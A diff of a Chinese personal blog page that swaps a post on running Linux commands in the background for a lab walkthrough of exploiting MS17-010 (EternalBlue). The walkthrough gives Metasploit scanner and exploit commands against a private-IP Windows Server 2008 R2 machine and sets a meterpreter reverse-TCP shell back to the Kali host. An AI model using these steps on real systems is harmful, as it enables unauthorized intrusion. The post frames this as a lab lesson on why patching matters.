@@ -2,15 +2,15 @@
 <html>
 
 <head>
-    <title>终端后台运行命令</title>
+    <title>ms17-010渗透测试</title>
     <meta charset="utf-8" />
     <meta http-equiv="X-UA-Compatible" content="IE=edge" />
     <meta name="viewport" content="width=device-width, initial-scale=1" />
-    <meta name="keywords" content="终端后台运行命令, Linux, Linux, CodeShurrik" />
-    <meta name="description" content="终端后台运行命令, Linux, Linux, 最近写了个服务器程序，需要在终端启动跑起来，但我是用ssh远程到服务器上操作的，断开连接程序也就中断了，网上查了查，实现了让命令后台运行并在前后台切换。" />
+    <meta name="keywords" content="ms17-010渗透测试, Windows, 渗透,Linux, CodeShurrik" />
+    <meta name="description" content="ms17-010渗透测试, Windows, 渗透,Linux, 主机工程师每天的一项日常工作就是给系统打各种补丁，我之前一直不以为然，认为这些补丁都可有可无。最近实践了下大名鼎鼎的ms17-010永恒之蓝，让我改变了这一想法。" />
     <meta name="theme-color" content="#2CA6CB"/>
     <link rel="shortcut icon" type="image/x-icon" media="screen" href="/blog/favicon.ico" />
-    <link rel="canonical" href="/blog/2014-08-07/%E7%BB%88%E7%AB%AF%E5%90%8E%E5%8F%B0%E8%BF%90%E8%A1%8C%E5%91%BD%E4%BB%A4/" />
+    <link rel="canonical" href="/blog/2019-11-11/ms17-010%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" />
     <link rel="alternate" type="application/rss+xml" title="CodeShurrik" href="/blog/feed.xml"  />
 
     <link rel="stylesheet" href="https://cdn.bootcss.com/bootstrap/3.3.0/css/bootstrap.min.css"/>
@@ -124,13 +124,15 @@
     <div class="content col-lg-9">
         <div class="sheet post">
           <header>
-            <h2>终端后台运行命令</h2>
+            <h2>ms17-010渗透测试</h2>
             <p class="post-meta">
-                <span class="octicon octicon-clock"></span> Aug 7, 2014
+                <span class="octicon octicon-clock"></span> Nov 11, 2019
             </p>
             <p class="post-tag">
-                <span><a href="/blog/category/#Linux"><span class="octicon octicon-list-unordered"></span>&nbsp;Linux</a></span>
+                <span><a href="/blog/category/#Windows"><span class="octicon octicon-list-unordered"></span>&nbsp;Windows</a></span>
                 <span>
+                    <a class="word-keep" href="/blog/tags/#渗透"><span class="octicon octicon-tag"></span>&nbsp;渗透</a>
+                    
                     <a class="word-keep" href="/blog/tags/#Linux"><span class="octicon octicon-tag"></span>&nbsp;Linux</a>
                     
                 </span>
@@ -138,43 +140,102 @@
           </header>
           <hr class="boundary">
           <article>
-            <p>最近写了个服务器程序，需要在终端启动跑起来，但我是用ssh远程到服务器上操作的，断开连接程序也就中断了，网上查了查，实现了让命令后台运行并在前后台切换。</p>
+            <p>主机工程师每天的一项日常工作就是给系统打各种补丁，我之前一直不以为然，认为这些补丁都可有可无。最近实践了下大名鼎鼎的ms17-010永恒之蓝，让我改变了这一想法。</p>
 
-<p>在命令结尾加”&amp;”符号可以让命令在后台运行,</p>
+<p><img src="https://user-images.githubusercontent.com/4729226/68555108-ee55d800-0466-11ea-8e6a-6d93d8481c54.png" alt="漏洞" /></p>
 
-<p>这时可以看到一个命令号和命令,后面是PID,表示正在运行,
-<a href="http://ixjx.sinaapp.com/%e7%bb%88%e7%ab%af%e5%90%8e%e5%8f%b0%e8%bf%90%e8%a1%8c%e5%91%bd%e4%bb%a4/qq%e5%9b%be%e7%89%8720140806220343/"><img src="http://ixjx-sae.stor.sinaapp.com/uploads/QQ图片20140806220343.jpg" alt="" title="20140806220343" /></a></p>
+<blockquote>
+  <p>主机：kali   192.168.106.242</p>
 
-<p>输入<code class="highlighter-rouge">fg</code>即可将后台命令调回前台,
-<!--more-->
-但如果有多个命令在后台运行,就需要<code class="highlighter-rouge">jobs</code>命令,</p>
+  <p>靶机：Windows Server 2008 R2   192.168.106.240</p>
+</blockquote>
 
-<p>jobs命令可以列出所有在后台运行的命令及运行状态,
-<a href="http://ixjx.sinaapp.com/%e7%bb%88%e7%ab%af%e5%90%8e%e5%8f%b0%e8%bf%90%e8%a1%8c%e5%91%bd%e4%bb%a4/qq%e5%9b%be%e7%89%8720140806220544/"><img src="http://ixjx-sae.stor.sinaapp.com/uploads/QQ图片20140806220544.jpg" alt="" title="20140806220544" /></a></p>
+<p>永恒之蓝是以前玩剩下的了，现在Metasploit里面已经集成了17-010漏洞，渗透测试更加方便与正式化，内网中用17-010去测一测会发现意外惊喜。</p>
 
-<p>这时使用<code class="highlighter-rouge">fg空格后接命令号</code>即可将对应的命令调回前台,</p>
+<p><img src="https://user-images.githubusercontent.com/4729226/68555461-dd0dcb00-0468-11ea-89b7-5fcc0f92abbe.png" alt="search" /></p>
 
-<p>如果一个命令已经在前台运行,又不想结束他,</p>
+<p>搜索到了4个相关的模块：</p>
 
-<p>按Ctrl+Z即可将命令移至后台,</p>
+<ol>
+  <li>auxiliary/admin/smb/ms17_010_command</li>
+  <li>auxiliary/scanner/smb/smb_ms17_010</li>
+  <li>exploit/windows/smb/ms17_010_eternalblue</li>
+  <li>exploit/windows/smb/ms17_010_psexec</li>
+</ol>
 
-<p>但这时可以看到该命令的状态是Stopped,
-<a href="http://ixjx.sinaapp.com/%e7%bb%88%e7%ab%af%e5%90%8e%e5%8f%b0%e8%bf%90%e8%a1%8c%e5%91%bd%e4%bb%a4/qq%e5%9b%be%e7%89%8720140806221100/"><img src="http://ixjx-sae.stor.sinaapp.com/uploads/QQ图片20140806221100.jpg" alt="" title="20140806221100" /></a></p>
+<p>先使用<code class="highlighter-rouge">auxiliary/scanner/smb/smb_ms17_010</code>扫描可能含有ms17-010漏洞的服务器。</p>
 
-<p>这时可以使用<code class="highlighter-rouge">bg空格后接命令号</code>将命令置于Runing状态.</p>
+<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>msf5 <span class="o">&gt;</span> use auxiliary/scanner/smb/smb_ms17_010
+msf5 auxiliary<span class="o">(</span>scanner/smb/smb_ms17_010<span class="o">)</span> <span class="o">&gt;</span> show options
 
-<p>上面的方法虽然可以让命令在后台运行,</p>
+Module options <span class="o">(</span>auxiliary/scanner/smb/smb_ms17_010<span class="o">)</span>:
 
-<p>但是退出登录或者关闭终端,后台的命令也会结束,</p>
+   Name         Current Setting                                                 Required  Description
+   <span class="nt">----</span>         <span class="nt">---------------</span>                                                 <span class="nt">--------</span>  <span class="nt">-----------</span>
+   CHECK_ARCH   <span class="nb">true                                                            </span>no        Check <span class="k">for </span>architecture on vulnerable hosts
+   CHECK_DOPU   <span class="nb">true                                                            </span>no        Check <span class="k">for </span>DOUBLEPULSAR on vulnerable hosts
+   CHECK_PIPE   <span class="nb">false                                                           </span>no        Check <span class="k">for </span>named pipe on vulnerable hosts
+   NAMED_PIPES  /usr/share/metasploit-framework/data/wordlists/named_pipes.txt  <span class="nb">yes       </span>List of named pipes to check
+   RHOSTS                                                                       <span class="nb">yes       </span>The target address range or CIDR identifier
+   RPORT        445                                                             <span class="nb">yes       </span>The SMB service port <span class="o">(</span>TCP<span class="o">)</span>
+   SMBDomain    <span class="nb">.</span>                                                               no        The Windows domain to use <span class="k">for </span>authentication
+   SMBPass                                                                      no        The password <span class="k">for </span>the specified username
+   SMBUser                                                                      no        The username to authenticate as
+   THREADS      1                                                               <span class="nb">yes       </span>The number of concurrent threads
 
-<p>如果不想让命令结束就需要nohup了,</p>
+msf5 auxiliary<span class="o">(</span>scanner/smb/smb_ms17_010<span class="o">)</span> <span class="o">&gt;</span> 
+</code></pre></div></div>
 
-<p>在退出后仍想继续运行的命令前面加上<code class="highlighter-rouge">nohop空格接命令+&amp;</code>即可。
-<a href="http://ixjx.sinaapp.com/%e7%bb%88%e7%ab%af%e5%90%8e%e5%8f%b0%e8%bf%90%e8%a1%8c%e5%91%bd%e4%bb%a4/qq%e5%9b%be%e7%89%8720140806222143/"><img src="http://ixjx-sae.stor.sinaapp.com/uploads/QQ图片20140806222143.jpg" alt="" title="20140806222143" /></a></p>
+<p><img src="https://user-images.githubusercontent.com/4729226/68555634-9c628180-0469-11ea-8ad9-dd0df9bda69b.png" alt="QQ截图20191111095648" /></p>
 
-<p>至于终止当然是kill^_^。</p>
+<p>可以看到靶机的ms17-010漏洞被扫描出来了。</p>
 
-<p>然后用crontab -e加定时任务就OK了。</p>
+<p>使用<code class="highlighter-rouge">exploit/windows/smb/ms17_010_eternalblue</code>攻击，这里设置meterpreter的payload。</p>
+
+<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>msf5 auxiliary<span class="o">(</span>scanner/smb/smb_ms17_010<span class="o">)</span> <span class="o">&gt;</span> use exploit/windows/smb/ms17_010_eternalblue
+msf5 exploit<span class="o">(</span>windows/smb/ms17_010_eternalblue<span class="o">)</span> <span class="o">&gt;</span> <span class="nb">set </span>rhosts 192.168.106.240
+rhosts <span class="o">=&gt;</span> 192.168.106.240
+msf5 exploit<span class="o">(</span>windows/smb/ms17_010_eternalblue<span class="o">)</span> <span class="o">&gt;</span> <span class="nb">set </span>payload windows/x64/meterpreter/reverse_tcp
+payload <span class="o">=&gt;</span> windows/x64/meterpreter/reverse_tcp
+msf5 exploit<span class="o">(</span>windows/smb/ms17_010_eternalblue<span class="o">)</span> <span class="o">&gt;</span> <span class="nb">set </span>lhost 192.168.106.242
+lhost <span class="o">=&gt;</span> 192.168.106.242
+msf5 exploit<span class="o">(</span>windows/smb/ms17_010_eternalblue<span class="o">)</span> <span class="o">&gt;</span> show options
+
+Module options <span class="o">(</span>exploit/windows/smb/ms17_010_eternalblue<span class="o">)</span>:
+
+   Name           Current Setting  Required  Description
+   <span class="nt">----</span>           <span class="nt">---------------</span>  <span class="nt">--------</span>  <span class="nt">-----------</span>
+   RHOSTS         192.168.106.240  <span class="nb">yes       </span>The target address range or CIDR identifier
+   RPORT          445              <span class="nb">yes       </span>The target port <span class="o">(</span>TCP<span class="o">)</span>
+   SMBDomain      <span class="nb">.</span>                no        <span class="o">(</span>Optional<span class="o">)</span> The Windows domain to use <span class="k">for </span>authentication
+   SMBPass                         no        <span class="o">(</span>Optional<span class="o">)</span> The password <span class="k">for </span>the specified username
+   SMBUser                         no        <span class="o">(</span>Optional<span class="o">)</span> The username to authenticate as
+   VERIFY_ARCH    <span class="nb">true             yes       </span>Check <span class="k">if </span>remote architecture matches exploit Target.
+   VERIFY_TARGET  <span class="nb">true             yes       </span>Check <span class="k">if </span>remote OS matches exploit Target.
+
+
+Payload options <span class="o">(</span>windows/x64/meterpreter/reverse_tcp<span class="o">)</span>:
+
+   Name      Current Setting  Required  Description
+   <span class="nt">----</span>      <span class="nt">---------------</span>  <span class="nt">--------</span>  <span class="nt">-----------</span>
+   EXITFUNC  thread           <span class="nb">yes       </span>Exit technique <span class="o">(</span>Accepted: <span class="s1">''</span>, seh, thread, process, none<span class="o">)</span>
+   LHOST     192.168.106.242  <span class="nb">yes       </span>The listen address <span class="o">(</span>an interface may be specified<span class="o">)</span>
+   LPORT     4444             <span class="nb">yes       </span>The listen port
+
+
+Exploit target:
+
+   Id  Name
+   <span class="nt">--</span>  <span class="nt">----</span>
+   0   Windows 7 and Server 2008 R2 <span class="o">(</span>x64<span class="o">)</span> All Service Packs
+
+</code></pre></div></div>
+
+<p><img src="https://user-images.githubusercontent.com/4729226/68555823-75587f80-046a-11ea-86c6-ff2cb296fa2b.png" alt="攻击成功" /></p>
+
+<p>exploit成功，接下来就可以为所欲为了~~</p>
+
+<p>所以说补丁还是得勤打，特别是永恒之蓝这种级别的漏洞，毕竟各大厂商不是吃白饭的。</p>
 
           </article>
           <hr class="boundary">
@@ -218,6 +279,10 @@
                 <ul>
                     
                     <li>
+                        <a href="/blog/tags#渗透"><span class="octicon octicon-tag"></span>&nbsp;渗透</a>
+                    </li>
+                    
+                    <li>
                         <a href="/blog/tags#Linux"><span class="octicon octicon-tag"></span>&nbsp;Linux</a>
                     </li>
                     
@@ -237,63 +302,63 @@
                     
                         
                             <li>
-                                <a href="/blog/2019-11-11/ms17-010%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/">ms17-010渗透测试</a>
-                            </li>
-                        
-                            <li>
-                                <a href="/blog/2019-08-20/Linux-namespace/">Linux namespace</a>
-                            </li>
-                        
-                            <li>
-                                <a href="/blog/2019-03-05/%E4%BD%BF%E7%94%A8-prometheus-%E5%92%8C-grafana-%E7%9B%91%E6%8E%A7-linux-%E6%9C%BA%E5%99%A8/">使用 prometheus 和 grafana 监控 linux 机器</a>
-                            </li>
-                        
-                            <li>
                                 <a href="/blog/2018-03-26/%E5%B9%B2%E6%8E%89Linux-Firefox%E7%9A%84Title-bar/">干掉Linux Firefox的Title bar</a>
                             </li>
                         
                             <li>
-                                <a href="/blog/2017-11-08/%E5%8A%A8%E6%89%8B%E5%AE%9E%E8%B7%B5Linux-VLAN-%E6%AF%8F%E5%A4%A95%E5%88%86%E9%92%9F%E7%9A%84OpenStack(13)/">动手实践Linux VLAN-每天5分钟的OpenStack(13)</a>
+                                <a href="/blog/2017-03-06/awk-sed-grep%E6%80%BB%E7%BB%93/">awk & sed & grep总结</a>
                             </li>
                         
                             <li>
-                                <a href="/blog/2017-11-08/Linux%E5%A6%82%E4%BD%95%E5%AE%9E%E7%8E%B0VLAN-%E6%AF%8F%E5%A4%A95%E5%88%86%E9%92%9F%E7%9A%84OpenStack(12)/">Linux如何实现VLAN-每天5分钟的OpenStack(12)</a>
+                                <a href="/blog/2016-02-16/Read-only-file-system/">Read-only file system</a>
                             </li>
                         
                             <li>
-                                <a href="/blog/2017-11-06/%E7%90%86%E8%A7%A3virbr0-%E6%AF%8F%E5%A4%A95%E5%88%86%E9%92%9F%E7%9A%84OpenStack(11)/">理解virbr0-每天5分钟的OpenStack(11)</a>
+                                <a href="/blog/2015-12-03/%E6%88%91%E5%B0%B1%E6%83%B3%E4%BF%9D%E5%AD%98%E4%B8%AA%E5%AF%86%E7%A0%81/">我就是想保存个密码</a>
                             </li>
                         
                             <li>
-                                <a href="/blog/2017-11-06/%E5%8A%A8%E6%89%8B%E5%AE%9E%E8%B7%B5%E8%99%9A%E6%8B%9F%E7%BD%91%E7%BB%9C-%E6%AF%8F%E5%A4%A95%E5%88%86%E9%92%9F%E7%9A%84OpenStack(10)/">动手实践虚拟网络-每天5分钟的OpenStack(10)</a>
+                                <a href="/blog/2015-10-17/mysql%E6%97%A5%E5%BF%97%E8%BD%AC%E5%82%A8%E7%9A%84%E9%87%8D%E8%A6%81%E6%80%A7/">log转储的重要性</a>
                             </li>
                         
                             <li>
-                                <a href="/blog/2017-11-05/KVM%E7%BD%91%E7%BB%9C%E8%99%9A%E6%8B%9F%E5%8C%96%E5%9F%BA%E7%A1%80-%E6%AF%8F%E5%A4%A95%E5%88%86%E9%92%9F%E7%9A%84OpenStack(9)/">KVM网络虚拟化基础-每天5分钟的OpenStack(9)</a>
+                                <a href="/blog/2015-08-16/%E5%85%B3%E4%BA%8Ecacti/">关于cacti</a>
                             </li>
                         
                             <li>
-                                <a href="/blog/2017-11-03/LVM%E7%B1%BB%E5%9E%8B%E7%9A%84Storage-Pool-%E6%AF%8F%E5%A4%A95%E5%88%86%E9%92%9F%E7%9A%84OpenStack(8)/">LVM类型的Storage Pool-每天5分钟的OpenStack(8)</a>
+                                <a href="/blog/2014-09-13/SDN%E7%BD%91%E7%BB%9C%E4%B9%8BMininet/">SDN网络之Mininet</a>
                             </li>
                         
                             <li>
-                                <a href="/blog/2017-11-03/KVM%E5%AD%98%E5%82%A8%E8%99%9A%E6%8B%9F%E5%8C%96-%E6%AF%8F%E5%A4%A95%E5%88%86%E9%92%9F%E7%9A%84OpenStack(7)/">KVM存储虚拟化-每天5分钟的OpenStack(7)</a>
+                                <a href="/blog/2014-08-07/%E7%BB%88%E7%AB%AF%E5%90%8E%E5%8F%B0%E8%BF%90%E8%A1%8C%E5%91%BD%E4%BB%A4/">终端后台运行命令</a>
                             </li>
                         
                             <li>
-                                <a href="/blog/2017-11-03/CPU%E5%92%8C%E5%86%85%E5%AD%98%E8%99%9A%E6%8B%9F%E5%8C%96%E5%8E%9F%E7%90%86-%E6%AF%8F%E5%A4%A95%E5%88%86%E9%92%9F%E7%9A%84OpenStack(6)/">CPU和内存虚拟化原理-每天5分钟的OpenStack(6)</a>
+                                <a href="/blog/2014-07-24/CentOS-5%E5%8D%87%E7%BA%A7Python%E7%89%88%E6%9C%AC-2.4-2.7/">CentOS 5升级Python版本（2.4->2.7）</a>
                             </li>
                         
                             <li>
-                                <a href="/blog/2017-11-02/%E8%BF%9C%E7%A8%8B%E7%AE%A1%E7%90%86KVM%E8%99%9A%E6%9C%BA-%E6%AF%8F%E5%A4%A95%E5%88%86%E9%92%9F%E7%9A%84OpenStack(5)/">远程管理KVM虚机-每天5分钟的OpenStack(5)</a>
+                                <a href="/blog/2014-06-26/Vim%E7%AE%80%E6%98%8E%E6%95%99%E7%A8%8B-CoolShell/">Vim简明教程【CoolShell】</a>
                             </li>
                         
                             <li>
-                                <a href="/blog/2017-11-02/%E8%99%9A%E6%8B%9F%E5%8C%96-%E6%AF%8F%E5%A4%A95%E5%88%86%E9%92%9F%E7%9A%84OpenStack(2)/">虚拟化-每天5分钟的OpenStack(2)</a>
+                                <a href="/blog/2014-05-25/apt-get-update%E7%9A%84%E6%97%B6%E5%80%99%E9%81%87%E5%88%B0-Hash-Sum-mismatch-%E9%94%99%E8%AF%AF/">apt-get update的时候遇到“Hash Sum mismatch”错误</a>
                             </li>
                         
                             <li>
-                                <a href="/blog/2017-11-02/%E5%90%AF%E5%8A%A8%E7%AC%AC%E4%B8%80%E4%B8%AAKVM%E8%99%9A%E6%9C%BA-%E6%AF%8F%E5%A4%A95%E5%88%86%E9%92%9F%E7%9A%84OpenStack(4)/">启动第一个KVM虚机-每天5分钟的OpenStack(4)</a>
+                                <a href="/blog/2013-08-18/Linux-%E7%9A%84%E5%90%AF%E5%8A%A8%E6%B5%81%E7%A8%8B/">Linux 的启动流程</a>
+                            </li>
+                        
+                            <li>
+                                <a href="/blog/2013-07-04/%E8%AE%A1%E7%AE%97%E6%9C%BA%E6%98%AF%E5%A6%82%E4%BD%95%E5%90%AF%E5%8A%A8%E7%9A%84/">计算机是如何启动的？</a>
+                            </li>
+                        
+                            <li>
+                                <a href="/blog/2013-06-01/Win7+Ubuntu12.04(EasyBCD%E7%A1%AC%E7%9B%98%E5%AE%89%E8%A3%85)/">Win7+Ubuntu12.04(EasyBCD硬盘安装)</a>
+                            </li>
+                        
+                            <li>
+                                <a href="/blog/2013-06-01/Linux%E4%B8%8BJDK%E7%9A%84%E5%AE%89%E8%A3%85%E4%B8%8E%E9%85%8D%E7%BD%AE/">Linux下JDK的安装与配置</a>
                             </li>
                         
                     
